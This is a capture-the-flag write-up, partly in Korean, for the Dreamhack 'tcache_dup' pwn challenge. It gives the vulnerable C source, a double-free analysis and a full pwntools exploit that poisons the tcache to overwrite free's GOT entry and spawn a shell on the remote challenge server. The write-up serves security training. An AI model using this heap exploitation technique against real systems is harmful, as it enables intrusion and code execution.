# tcache_dup - Dreamhack
## Challenge Info
- Date: 2025
- CTF Name: Dreamhack
- Category: pwn
- Difficulty (subjective): easy
- Points: 2
- Provided Files: libc-2.27.so, tcache_dup.c, tcache_dup(ELF)
- tools:
## Brief Description
## Initial Analysis
### Environment
``` sh
checksec tcache_dup
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```
### Code
``` c
// gcc -o tcache_dup tcache_dup.c -no-pie
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

char *ptr[10];

void alarm_handler() {
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int create(int cnt) {
    int size;

    if (cnt > 10) {
        return -1;
    }
    printf("Size: ");
    scanf("%d", &size);

    ptr[cnt] = malloc(size);

    if (!ptr[cnt]) {
        return -1;
    }

    printf("Data: ");
    read(0, ptr[cnt], size);
}

int delete() {
    int idx;

    printf("idx: ");
    scanf("%d", &idx);

    if (idx > 10) {
        return -1;
    }

    free(ptr[idx]);
}

void get_shell() {
    system("/bin/sh");
}

int main() {
    int idx;
    int cnt = 0;

    initialize();

    while (1) {
        printf("1. Create\n");
        printf("2. Delete\n");
        printf("> ");
        scanf("%d", &idx);

        switch (idx) {
            case 1:
                create(cnt);
                cnt++;
                break;
            case 2:
                delete();
                break;
            default:
                break;
        }
    }

    return 0;
}
```
## Vulnerability
### DFB(Double Free Bug)
``` c
int delete() {
    int idx;

    printf("idx: ");
    scanf("%d", &idx);

    if (idx > 10) {
        return -1;
    }

    free(ptr[idx]);
}
```
`free()` 시 어떠한 검증도 하지 않는다. 또한 libc-2.27을 사용하므로 관련 보호 기법이 없다.
## Exploit
### Strategy
DFB를 이용하여 `free()`의 GOT를 `get_shell()`의 주소로 덮어쓸 것이다. 또한 PIE가 비활성화 되어 있으므로, 바이너리에서 직접 찾은 주소를 그대로 사용할 수 있다. 
### Exploitation Steps
### Stack Frame of main
| Variable Name | Offset from EBP |
| --- | --- |
### payload
``` python
from pwn import *

p = remote('host8.dreamhack.games', 17184)
context.arch = "amd64"
e = ELF('./tcache_dup')
libc = ELF('x64/libc-2.27.so')

# func
def create(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', str(size).encode())
    p.sendafter(b': ', data)

def delete(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b': ', str(idx).encode())

# DFB
create(0x10, b'A'*8) # chunk A
delete(0) # tcache: chunk A
delete(0) # tcache: chunk A -> chunk A

# GOT overwrite
free = e.got['free']
get_shell = e.symbols['get_shell']
create(0x10, p64(free)) # tcache: chunk A -> free_got
create(0x10, b'A'*8) # tcache: free_got
create(0x10, p64(get_shell)) # overwrite free_got -> get_shell
delete(0)

# interactive
p.interactive()
```
